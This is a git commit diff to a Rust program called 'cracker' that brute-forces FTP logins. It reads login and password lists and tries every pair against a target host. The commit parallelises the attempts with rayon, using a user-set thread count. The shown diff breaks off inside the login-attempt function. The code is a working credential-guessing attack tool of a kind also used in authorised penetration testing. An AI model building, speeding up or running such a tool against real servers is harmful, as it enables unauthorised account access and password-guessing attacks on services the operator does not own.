ea30df2b71f08a74c878c1892b4725fe523f5cb1
puhtaytow <18026645+puhtaytow@users.noreply.github.com>
2024-03-03 10:56:02 +0100

    introduce rayon for par scanning (#1)

--- src/main.rs
+++ src/main.rs
@@ -1,6 +1,6 @@
 use anyhow::{Error, Ok};
 use core::result::Result::Ok as Okb;
-// use rayon::prelude::*;
+use rayon::prelude::*;
 use std::env;
 use std::fs::File;
 use std::io::{BufRead, BufReader};
@@ -13,12 +13,18 @@ mod error;
 fn main() -> Result<(), Error> {
     let args: Vec<String> = env::args().collect();
     check_arguments(&args)?;
+
+    rayon::ThreadPoolBuilder::new()
+        .num_threads(args[4].parse::<usize>().unwrap())
+        .build_global()
+        .unwrap();
+
     cracker(&args[1], &args[2], &args[3])?;
     Ok(())
 }
 
 fn check_arguments(args: &Vec<String>) -> Result<(), Error> {
-    if args.len() == 4 {
+    if args.len() == 5 {
         return Ok(());
     }
     Err(error::CrackerError::WrongArguments.into())
@@ -26,16 +32,17 @@ fn check_arguments(args: &Vec<String>) -> Result<(), Error> {
 
 fn cracker(logins: &str, passwords: &str, target: &str) -> Result<(), Error> {
     let (logins, passwords) = parse_files(logins, passwords)?;
-    for login in &logins {
-        for password in &passwords {
-            caller(login, password, target)?;
-        }
-    }
+    logins.into_par_iter().for_each(|login| {
+        passwords
+            .clone()
+            .into_par_iter()
+            .for_each(|password| caller(&login, &password, target).unwrap())
+    });
     Err(error::CrackerError::CredentialsNotFound.into())
 }
 
 fn caller(login: &str, password: &str, target: &str) -> Result<(), Error> {
-    println!("trying: {}:{} - {}", login, password, target);
+    println!("      trying: {}:{} - {}", login, password, target);
     let mut ftp_stream = FtpStream::connect(target)?;
     match ftp_stream.login(login, password) {
         Err(_) => {}
